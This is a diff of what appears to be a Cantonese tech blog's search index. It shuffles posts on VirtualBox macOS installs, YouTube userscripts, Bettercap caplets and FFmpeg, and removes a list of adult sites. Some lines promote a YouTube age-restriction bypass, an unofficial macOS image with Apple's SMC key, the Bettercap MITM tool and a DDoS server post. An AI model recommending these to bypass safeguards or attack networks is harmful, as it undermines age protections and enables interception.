@@ -4997,30 +5021,6 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
 <h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/05/20/PS2-Virtual-Machine-emalator-pcsx2/program.png" class="">]]></content>
       <tags>
         <tag>Games</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>成人網站大全 - 不含殘體網</title>
-    <url>/2022/01/22/Porn-web-list/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>睇咸網打個飛機又唔知去咩網好？<br>唔緊要，呢度我擺條 List 俾你慢慢 J 飽佢！</p>
-<h2 id="真人網站-主要"><a href="#真人網站-主要" class="headerlink" title="真人網站 (主要)"></a>真人網站 (主要)</h2><h3 id="Pornhub"><a href="#Pornhub" class="headerlink" title="Pornhub"></a>Pornhub</h3><img src="/2022/01/22/Porn-web-list/pornhub.png" class="">
-<p><a href="https://www.pornhub.com/">https://www.pornhub.com/</a></p>
-<h3 id="porn87"><a href="#porn87" class="headerlink" title="porn87"></a>porn87</h3><img src="/2022/01/22/Porn-web-list/porn87.png" class="">
-<p>porn87.com</p>
-<h3 id="thisav"><a href="#thisav" class="headerlink" title="thisav"></a>thisav</h3><img src="/2022/01/22/Porn-web-list/thisav.png" class="">
-<p>thisav.com</p>
-<h2 id="動畫網站-主要"><a href="#動畫網站-主要" class="headerlink" title="動畫網站 (主要)"></a>動畫網站 (主要)</h2><h3 id="avbebe"><a href="#avbebe" class="headerlink" title="avbebe"></a>avbebe</h3><img src="/2022/01/22/Porn-web-list/avbebe.png" class="">
-<p><a href="https://avbebe.com/">https://avbebe.com/</a></p>
-<h3 id="hanime-tv"><a href="#hanime-tv" class="headerlink" title="hanime.tv"></a>hanime.tv</h3><img src="/2022/01/22/Porn-web-list/hanime.png" class="">
-<p><a href="https://hanime.tv/">https://hanime.tv/</a></p>
-<h3 id="hanime1"><a href="#hanime1" class="headerlink" title="hanime1"></a>hanime1</h3><img src="/2022/01/22/Porn-web-list/hanime1.png" class="">
-<p><a href="https://hanime1.me/">https://hanime1.me/</a></p>
-]]></content>
-      <categories>
-        <category>甜網</category>
-      </categories>
-      <tags>
-        <tag>成人</tag>
       </tags>
   </entry>
   <entry>
@@ -5465,50 +5465,6 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
-    <title>Tampermonkey - 插件推薦 (Youtube)</title>
-    <url>/2022/02/08/Tampermonkey-extensions-youtube/</url>
-    <content><![CDATA[<h1 id="YouTube-年齡限制-Bypass"><a href="#YouTube-年齡限制-Bypass" class="headerlink" title="YouTube 年齡限制 Bypass"></a>YouTube 年齡限制 Bypass</h1><h2 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h2><p>有時想睇條片，但係條片話18歲以上先可以睇，仲要你登入，<br>咁咪好撚麻煩？<br>但係唔緊要，只要我地裝呢個 Extensions 就可以 解除呢個限制</p>
-<p><a href="https://greasyfork.org/en/scripts/423851-simple-youtube-age-restriction-bypass">https://greasyfork.org/en/scripts/423851-simple-youtube-age-restriction-bypass</a></p>
-<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><img src="/2022/02/08/Tampermonkey-extensions-youtube/ytagebypass.png" class="">
-
-<p>Github : <a href="https://github.com/zerodytrash/Simple-YouTube-Age-Restriction-Bypass">https://github.com/zerodytrash/Simple-YouTube-Age-Restriction-Bypass</a></p>
-<hr style="border:2px solid grey"></hr>
-
-<h1 id="Youtube-Search-While-Watching-Video"><a href="#Youtube-Search-While-Watching-Video" class="headerlink" title="Youtube - Search While Watching Video"></a>Youtube - Search While Watching Video</h1><h2 id="說明-1"><a href="#說明-1" class="headerlink" title="說明"></a>說明</h2><p>有時睇緊片你又唔想開另一頁去Serach 你想喺 Youtube 既片？<br>呢個插件可以幫到你！</p>
-<img src="wsearchplay.gif" title="" style="" width="900px">
-
-<p><a href="https://greasyfork.org/en/scripts/29451-youtube-search-while-watching-video">https://greasyfork.org/en/scripts/29451-youtube-search-while-watching-video</a></p>
-<hr style="border:2px solid grey"></hr>
-
-<h1 id="Youtube-封面"><a href="#Youtube-封面" class="headerlink" title="Youtube 封面"></a>Youtube 封面</h1><h2 id="說明-2"><a href="#說明-2" class="headerlink" title="說明"></a>說明</h2><p>你想喺 Youtube 搵你而加睇緊既片既封面圖？<br>呢個插件會幫到你！</p>
-<img src="/2022/02/08/Tampermonkey-extensions-youtube/yt-cover.png" class="">
-
-<p><a href="https://greasyfork.org/zh-TW/scripts/420140-youtube-%E5%B0%81%E9%9D%A2">https://greasyfork.org/zh-TW/scripts/420140-youtube-%E5%B0%81%E9%9D%A2</a></p>
-<hr style="border:2px solid grey"></hr>
-
-<h1 id="youtube繼續播放"><a href="#youtube繼續播放" class="headerlink" title="youtube繼續播放"></a>youtube繼續播放</h1><h2 id="說明-3"><a href="#說明-3" class="headerlink" title="說明"></a>說明</h2><p>有時你喺另一個Windows做左好耐野 但係你又係聽緊歌，<br>又或者你本身已經掛緊機，但又唔想 Youtube 播緊既野 自動停 ?<br>呢個插件會幫到你解決！</p>
-<img src="/2022/02/08/Tampermonkey-extensions-youtube/youtube-continue-play.png" class="">
-
-<p><a href="https://greasyfork.org/en/scripts/398142-youtube-continue-play">https://greasyfork.org/en/scripts/398142-youtube-continue-play</a></p>
-<hr style="border:2px solid grey"></hr>
-
-<h1 id="Return-YouTube-Dislike"><a href="#Return-YouTube-Dislike" class="headerlink" title="Return YouTube Dislike"></a>Return YouTube Dislike</h1><h2 id="說明-4"><a href="#說明-4" class="headerlink" title="說明"></a>說明</h2><p>而加既 Youtube 會 Hide 左 條片既 Dislike 數，<br>但係明明可能你會睇 Dislike數去判斷條片既質素，<br>咁做真係搞到好麻煩，<br>但係唔緊要！<br>呢個插件幫到你解決！</p>
-<img src="/2022/02/08/Tampermonkey-extensions-youtube/return-yt-dislike.png" class="">
-
-<p>官網 : <a href="https://www.returnyoutubedislike.com/">https://www.returnyoutubedislike.com/</a><br>Github : <a href="https://github.com/Anarios/return-youtube-dislike">https://github.com/Anarios/return-youtube-dislike</a></p>
-<h1 id="本地-YouTube-下載器"><a href="#本地-YouTube-下載器" class="headerlink" title="本地 YouTube 下載器"></a>本地 YouTube 下載器</h1><h2 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h2><ul>
-<li><a href="https://greasyfork.org/en/scripts/369400-local-youtube-downloader">https://greasyfork.org/en/scripts/369400-local-youtube-downloader</a></li>
-</ul>
-<h2 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h2><img src="/2022/02/08/Tampermonkey-extensions-youtube/download.png" class="">]]></content>
-      <categories>
-        <category>Browser</category>
-      </categories>
-      <tags>
-        <tag>Tampermonkey</tag>
-        <tag>Extensions</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Telegram - 通訊程式</title>
     <url>/2022/05/24/Telegram-Apps/</url>
     <content><![CDATA[<p align="center">
@@ -5601,6 +5557,50 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       <tags>
         <tag>指令</tag>
         <tag>安裝</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tampermonkey - 插件推薦 (Youtube)</title>
+    <url>/2022/02/08/Tampermonkey-extensions-youtube/</url>
+    <content><![CDATA[<h1 id="YouTube-年齡限制-Bypass"><a href="#YouTube-年齡限制-Bypass" class="headerlink" title="YouTube 年齡限制 Bypass"></a>YouTube 年齡限制 Bypass</h1><h2 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h2><p>有時想睇條片，但係條片話18歲以上先可以睇，仲要你登入，<br>咁咪好撚麻煩？<br>但係唔緊要，只要我地裝呢個 Extensions 就可以 解除呢個限制</p>
+<p><a href="https://greasyfork.org/en/scripts/423851-simple-youtube-age-restriction-bypass">https://greasyfork.org/en/scripts/423851-simple-youtube-age-restriction-bypass</a></p>
+<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><img src="/2022/02/08/Tampermonkey-extensions-youtube/ytagebypass.png" class="">
+
+<p>Github : <a href="https://github.com/zerodytrash/Simple-YouTube-Age-Restriction-Bypass">https://github.com/zerodytrash/Simple-YouTube-Age-Restriction-Bypass</a></p>
+<hr style="border:2px solid grey"></hr>
+
+<h1 id="Youtube-Search-While-Watching-Video"><a href="#Youtube-Search-While-Watching-Video" class="headerlink" title="Youtube - Search While Watching Video"></a>Youtube - Search While Watching Video</h1><h2 id="說明-1"><a href="#說明-1" class="headerlink" title="說明"></a>說明</h2><p>有時睇緊片你又唔想開另一頁去Serach 你想喺 Youtube 既片？<br>呢個插件可以幫到你！</p>
+<img src="wsearchplay.gif" title="" style="" width="900px">
+
+<p><a href="https://greasyfork.org/en/scripts/29451-youtube-search-while-watching-video">https://greasyfork.org/en/scripts/29451-youtube-search-while-watching-video</a></p>
+<hr style="border:2px solid grey"></hr>
+
+<h1 id="Youtube-封面"><a href="#Youtube-封面" class="headerlink" title="Youtube 封面"></a>Youtube 封面</h1><h2 id="說明-2"><a href="#說明-2" class="headerlink" title="說明"></a>說明</h2><p>你想喺 Youtube 搵你而加睇緊既片既封面圖？<br>呢個插件會幫到你！</p>
+<img src="/2022/02/08/Tampermonkey-extensions-youtube/yt-cover.png" class="">
+
+<p><a href="https://greasyfork.org/zh-TW/scripts/420140-youtube-%E5%B0%81%E9%9D%A2">https://greasyfork.org/zh-TW/scripts/420140-youtube-%E5%B0%81%E9%9D%A2</a></p>
+<hr style="border:2px solid grey"></hr>
+
+<h1 id="youtube繼續播放"><a href="#youtube繼續播放" class="headerlink" title="youtube繼續播放"></a>youtube繼續播放</h1><h2 id="說明-3"><a href="#說明-3" class="headerlink" title="說明"></a>說明</h2><p>有時你喺另一個Windows做左好耐野 但係你又係聽緊歌，<br>又或者你本身已經掛緊機，但又唔想 Youtube 播緊既野 自動停 ?<br>呢個插件會幫到你解決！</p>
+<img src="/2022/02/08/Tampermonkey-extensions-youtube/youtube-continue-play.png" class="">
+
+<p><a href="https://greasyfork.org/en/scripts/398142-youtube-continue-play">https://greasyfork.org/en/scripts/398142-youtube-continue-play</a></p>
+<hr style="border:2px solid grey"></hr>
+
+<h1 id="Return-YouTube-Dislike"><a href="#Return-YouTube-Dislike" class="headerlink" title="Return YouTube Dislike"></a>Return YouTube Dislike</h1><h2 id="說明-4"><a href="#說明-4" class="headerlink" title="說明"></a>說明</h2><p>而加既 Youtube 會 Hide 左 條片既 Dislike 數，<br>但係明明可能你會睇 Dislike數去判斷條片既質素，<br>咁做真係搞到好麻煩，<br>但係唔緊要！<br>呢個插件幫到你解決！</p>
+<img src="/2022/02/08/Tampermonkey-extensions-youtube/return-yt-dislike.png" class="">
+
+<p>官網 : <a href="https://www.returnyoutubedislike.com/">https://www.returnyoutubedislike.com/</a><br>Github : <a href="https://github.com/Anarios/return-youtube-dislike">https://github.com/Anarios/return-youtube-dislike</a></p>
+<h1 id="本地-YouTube-下載器"><a href="#本地-YouTube-下載器" class="headerlink" title="本地 YouTube 下載器"></a>本地 YouTube 下載器</h1><h2 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h2><ul>
+<li><a href="https://greasyfork.org/en/scripts/369400-local-youtube-downloader">https://greasyfork.org/en/scripts/369400-local-youtube-downloader</a></li>
+</ul>
+<h2 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h2><img src="/2022/02/08/Tampermonkey-extensions-youtube/download.png" class="">]]></content>
+      <categories>
+        <category>Browser</category>
+      </categories>
+      <tags>
+        <tag>Tampermonkey</tag>
+        <tag>Extensions</tag>
       </tags>
   </entry>
   <entry>
@@ -5934,74 +5934,6 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
-    <title>VirtualBox - 安裝 MacOS BigSur</title>
-    <url>/2022/01/16/VirtualBox-install-MacOS-BigSur/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喺開始之前，我地需要下載呢個檔案</p>
-<ul>
-<li><a href="https://www.mediafire.com/file/9vuo3rcmv0r8ag4/MAC_OS_BIG_SUR.rar/file">MacOS BigSur iso Files</a></li>
-</ul>
-<p>下載左之後，我地開 VirtualBox 開 Create 個新既</p>
-<center>
-名就你鐘意起乜就起乜
-<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/1.png" class="">
-
-
-<p>選擇你想要既 Ram 既大小</p>
-<p>1GB = 1024 MB<br>1024 * 4 = 4096<br>所以 4GB Ram = 4096</p>
-<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/4096.png" class="">
-
-
-<p>立即建立虛擬主機 </p>
-<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/vmdk.png" class="">
-
-<p>選擇 VDI<br>選擇返我地岩岩下載完既 vmdk 檔</p>
-<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/VDI.png" class="">
-
-<p>選擇第一個 動態分配</p>
-<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/AN.png" class="">
-
-<p>打你要既 HardDisk 大小</p>
-<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/harddisk.png" class="">
-
-<p>然後入部機既 Setting &gt; 一般 &gt;<br>將共用剪貼簿同拖放改做雙向</p>
-<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/d.png" class="">
-
-<p>再黎入去 系統 &gt; 主機版<br>將開機順序既 <code>軟碟</code> <code>光碟</code> Tick 走佢唔要</p>
-<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/system.png" class="">
-
-<p>再黎入去 系統 &gt; 虛理器<br>將虛理器既 CPU 改做 4</p>
-<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/cpu-4.png" class="">
-
-<p>再黎入去 顯示 &gt; 畫面<br>將 視訊記憶體改做 128 MB<br>再將 圖形控制器 改做 VBoxSVGA</p>
-<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/SVGA-128.png" class="">
-
-</center>
-
-<p>然後開你既 PowerShell CD 入去 你安裝既 VirtualBox 位置</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Now Paths is c:\</span></span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\Program Files\Oracle\VirtualBox\&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>再打呢6句野，<br>注意，Your VM Name 係要改返做你起既 VM 名稱</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\VBoxManage.exe modifyvm <span class="string">&quot;Your VM Name&quot;</span> --cpuidset 00000001 000106e5 00100800 0098e3fd bfebfbff</span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiSystemProduct&quot;</span> <span class="string">&quot;iMac11,3&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiSystemVersion&quot;</span> <span class="string">&quot;1.0&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiBoardProduct&quot;</span> <span class="string">&quot;Iloveapple&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/smc/0/Config/DeviceKey&quot;</span> <span class="string">&quot;ourhardworkbythesewordsguardedpleasedontsteal(c)AppleComputerInc&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/smc/0/Config/GetKeyFromRealSMC&quot;</span> 1</span><br></pre></td></tr></table></figure>
-
-<p>完成左之後開你部機再選擇返岩岩下載左既 iso 檔，咁就成功啦。</p>
-<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/Hi%20open.png" class="">
-
-<p>成功。</p>
-<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/DONE-OPEN.png" class="">
-<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/DONE-OPEN-2.png" class="">
-
-
-<p>參考資料:<br><a href="https://www.youtube.com/watch?v=0RJWGWQfgYs">https://www.youtube.com/watch?v=0RJWGWQfgYs</a><br><a href="https://www.dev2qa.com/how-to-install-macos-on-virtualbox-in-windows-10/">https://www.dev2qa.com/how-to-install-macos-on-virtualbox-in-windows-10/</a></p>
-]]></content>
-      <categories>
-        <category>VirtualBox</category>
-        <category>MacOS</category>
-      </categories>
-      <tags>
-        <tag>安裝</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>VirtualBox - 安裝 Windows 11</title>
     <url>/2022/01/21/VirtualBox-install-windows-11/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喺 VirtualBox 入面 安裝 Windows 11 會有硬件問題，<br>佢係未可以做到最低硬件要求，<br>咁我地要入 regedit 加一加野。</p>
@@ -6204,6 +6136,74 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
         <tag>BIOS</tag>
         <tag>Shortkeys</tag>
         <tag>問題</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VirtualBox - 安裝 MacOS BigSur</title>
+    <url>/2022/01/16/VirtualBox-install-MacOS-BigSur/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喺開始之前，我地需要下載呢個檔案</p>
+<ul>
+<li><a href="https://www.mediafire.com/file/9vuo3rcmv0r8ag4/MAC_OS_BIG_SUR.rar/file">MacOS BigSur iso Files</a></li>
+</ul>
+<p>下載左之後，我地開 VirtualBox 開 Create 個新既</p>
+<center>
+名就你鐘意起乜就起乜
+<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/1.png" class="">
+
+
+<p>選擇你想要既 Ram 既大小</p>
+<p>1GB = 1024 MB<br>1024 * 4 = 4096<br>所以 4GB Ram = 4096</p>
+<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/4096.png" class="">
+
+
+<p>立即建立虛擬主機 </p>
+<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/vmdk.png" class="">
+
+<p>選擇 VDI<br>選擇返我地岩岩下載完既 vmdk 檔</p>
+<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/VDI.png" class="">
+
+<p>選擇第一個 動態分配</p>
+<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/AN.png" class="">
+
+<p>打你要既 HardDisk 大小</p>
+<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/harddisk.png" class="">
+
+<p>然後入部機既 Setting &gt; 一般 &gt;<br>將共用剪貼簿同拖放改做雙向</p>
+<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/d.png" class="">
+
+<p>再黎入去 系統 &gt; 主機版<br>將開機順序既 <code>軟碟</code> <code>光碟</code> Tick 走佢唔要</p>
+<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/system.png" class="">
+
+<p>再黎入去 系統 &gt; 虛理器<br>將虛理器既 CPU 改做 4</p>
+<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/cpu-4.png" class="">
+
+<p>再黎入去 顯示 &gt; 畫面<br>將 視訊記憶體改做 128 MB<br>再將 圖形控制器 改做 VBoxSVGA</p>
+<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/SVGA-128.png" class="">
+
+</center>
+
+<p>然後開你既 PowerShell CD 入去 你安裝既 VirtualBox 位置</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Now Paths is c:\</span></span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\Program Files\Oracle\VirtualBox\&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>再打呢6句野，<br>注意，Your VM Name 係要改返做你起既 VM 名稱</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\VBoxManage.exe modifyvm <span class="string">&quot;Your VM Name&quot;</span> --cpuidset 00000001 000106e5 00100800 0098e3fd bfebfbff</span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiSystemProduct&quot;</span> <span class="string">&quot;iMac11,3&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiSystemVersion&quot;</span> <span class="string">&quot;1.0&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiBoardProduct&quot;</span> <span class="string">&quot;Iloveapple&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/smc/0/Config/DeviceKey&quot;</span> <span class="string">&quot;ourhardworkbythesewordsguardedpleasedontsteal(c)AppleComputerInc&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/smc/0/Config/GetKeyFromRealSMC&quot;</span> 1</span><br></pre></td></tr></table></figure>
+
+<p>完成左之後開你部機再選擇返岩岩下載左既 iso 檔，咁就成功啦。</p>
+<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/Hi%20open.png" class="">
+
+<p>成功。</p>
+<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/DONE-OPEN.png" class="">
+<img src="/2022/01/16/VirtualBox-install-MacOS-BigSur/DONE-OPEN-2.png" class="">
+
+
+<p>參考資料:<br><a href="https://www.youtube.com/watch?v=0RJWGWQfgYs">https://www.youtube.com/watch?v=0RJWGWQfgYs</a><br><a href="https://www.dev2qa.com/how-to-install-macos-on-virtualbox-in-windows-10/">https://www.dev2qa.com/how-to-install-macos-on-virtualbox-in-windows-10/</a></p>
+]]></content>
+      <categories>
+        <category>VirtualBox</category>
+        <category>MacOS</category>
+      </categories>
+      <tags>
+        <tag>安裝</tag>
       </tags>
   </entry>
   <entry>
@@ -6966,6 +6966,32 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
+    <title>Bettercap - 安裝 caplets 額外工具</title>
+    <url>/2022/01/14/bettercap-install-caplets/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Bettercap 既 Caplets read 唔到？<br>就算打完 <code>caplets.update</code> 都係咁？<br>咁係因為唔知點解佢係冇裝到俾你<br>咁我地手動裝返就 OK …</p>
+<h1 id="安裝-手動-推薦方法"><a href="#安裝-手動-推薦方法" class="headerlink" title="安裝 (手動 [推薦方法])"></a>安裝 (手動 [推薦方法])</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/bettercap/caplets.git</span><br><span class="line">cd caplets</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+
+<p>再打返</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">caplets.show</span><br></pre></td></tr></table></figure>
+
+<h1>咁就成功</h1>
+
+<h1 id="安裝-不推薦方法"><a href="#安裝-不推薦方法" class="headerlink" title="安裝 (不推薦方法)"></a>安裝 (不推薦方法)</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">caplets.update</span><br></pre></td></tr></table></figure>
+
+<h1>成功。</h1>
+
+<p>參考資料:<br><a href="https://githubhelp.com/bettercap/caplets">https://githubhelp.com/bettercap/caplets</a><br><a href="https://github.com/bettercap/caplets">https://github.com/bettercap/caplets</a><br><a href="https://githubhelp.com/bettercap/caplets">https://githubhelp.com/bettercap/caplets</a></p>
+]]></content>
+      <categories>
+        <category>Kali</category>
+      </categories>
+      <tags>
+        <tag>指令</tag>
+        <tag>安裝</tag>
+        <tag>Bettercap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Bettercap - MITM 工具</title>
     <url>/2022/01/14/bettercap-commands/</url>
     <content><![CDATA[<img src="/2022/01/14/bettercap-commands/logo.png" class="">
@@ -6997,32 +7023,6 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </categories>
       <tags>
         <tag>指令</tag>
-        <tag>Bettercap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bettercap - 安裝 caplets 額外工具</title>
-    <url>/2022/01/14/bettercap-install-caplets/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Bettercap 既 Caplets read 唔到？<br>就算打完 <code>caplets.update</code> 都係咁？<br>咁係因為唔知點解佢係冇裝到俾你<br>咁我地手動裝返就 OK …</p>
-<h1 id="安裝-手動-推薦方法"><a href="#安裝-手動-推薦方法" class="headerlink" title="安裝 (手動 [推薦方法])"></a>安裝 (手動 [推薦方法])</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/bettercap/caplets.git</span><br><span class="line">cd caplets</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
-
-<p>再打返</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">caplets.show</span><br></pre></td></tr></table></figure>
-
-<h1>咁就成功</h1>
-
-<h1 id="安裝-不推薦方法"><a href="#安裝-不推薦方法" class="headerlink" title="安裝 (不推薦方法)"></a>安裝 (不推薦方法)</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">caplets.update</span><br></pre></td></tr></table></figure>
-
-<h1>成功。</h1>
-
-<p>參考資料:<br><a href="https://githubhelp.com/bettercap/caplets">https://githubhelp.com/bettercap/caplets</a><br><a href="https://github.com/bettercap/caplets">https://github.com/bettercap/caplets</a><br><a href="https://githubhelp.com/bettercap/caplets">https://githubhelp.com/bettercap/caplets</a></p>
-]]></content>
-      <categories>
-        <category>Kali</category>
-      </categories>
-      <tags>
-        <tag>指令</tag>
-        <tag>安裝</tag>
         <tag>Bettercap</tag>
       </tags>
   </entry>
@@ -7185,6 +7185,29 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
+    <title>唔同既 Linux Terminal 工具</title>
+    <url>/2022/01/12/different-terminal-with-linux/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>成日用黎用去都係 Default 既 Linux Terminal 想轉下其他 Terminal？</p>
+<p>以下介紹幾款！</p>
+<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><ul>
+<li><a href="https://konsole.kde.org/">Konsole</a> - KDE’s Terminal Emulator</li>
+<li><a href="https://terminator-gtk3.readthedocs.io/en/latest/">Terminator</a> - simplest Terminator</li>
+</ul>
+<h2 id="下載-Konsole"><a href="#下載-Konsole" class="headerlink" title="下載 Konsole"></a>下載 Konsole</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install konsole -y</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/01/12/different-terminal-with-linux/icon_konsole.png" class="">
+
+<h2 id="下載-Terminator"><a href="#下載-Terminator" class="headerlink" title="下載 Terminator"></a>下載 Terminator</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install terminator -y</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/01/12/different-terminal-with-linux/icon_terminator.png" class="">]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>指令</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DDoS - Server By Scarface</title>
     <url>/2021/12/11/ddos-server/</url>
     <content><![CDATA[<p><a href="../ddos-client">[CLIENT] client.c</a><br><a href="">[SERVERSIDE] server.c</a></p>
@@ -7215,20 +7238,54 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
-    <title>Git - 更新</title>
-    <url>/2022/01/30/git-console-update/</url>
-    <content><![CDATA[<h1 id="點-update"><a href="#點-update" class="headerlink" title="點 update ?"></a>點 update ?</h1><p>呢個方法只係接受喺 <a href="https://git-scm.com/">git-scm</a> 下載既。<br>如果係用 Package Manager 就唔係咁更新。</p>
-<p>只需要跟返你用緊既 Package manager，<br>再 upgrade 就得 ~</p>
-<p>只需要打</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git update</span><br></pre></td></tr></table></figure>
+    <title>FFmpeg - 影片 / 音樂 轉換格式 / 下載影片 工具</title>
+    <url>/2021/12/11/ffmpeg-command/</url>
+    <content><![CDATA[<h1 id="FFMPEG"><a href="#FFMPEG" class="headerlink" title="FFMPEG"></a>FFMPEG</h1><p>FFmpeg 是處理多媒體內容（例如音頻、視頻、字幕和相關元數據）的庫和工具的集合。</p>
+<h2 id="Libraries"><a href="#Libraries" class="headerlink" title="Libraries"></a>Libraries</h2><ul>
+<li><code>libavcodec</code> 提供了更廣泛的編解碼器的實現。</li>
+<li><code>libavformat</code> 實現流協議、容器格式和基本 I/O 訪問。</li>
+<li><code>libavutil</code> 包括散列器、解壓縮器和其他實用功能。</li>
+<li><code>libavfilter</code> 提供了通過連接過濾器的有向圖來改變解碼的音頻和視頻的方法。</li>
+<li><code>libavdevice</code> 提供了訪問捕獲和播放設備的抽象。</li>
+<li><code>libswresample</code> 實現音頻混合和重採樣例程。</li>
+<li><code>libswscale</code> 實現顏色轉換和縮放例程。</li>
+</ul>
+<p>＃＃ 工具</p>
+<ul>
+<li><a href="https://ffmpeg.org/ffmpeg.html">ffmpeg</a> 是一個命令行工具箱<br> 操作、轉換和流式傳輸多媒體內容。</li>
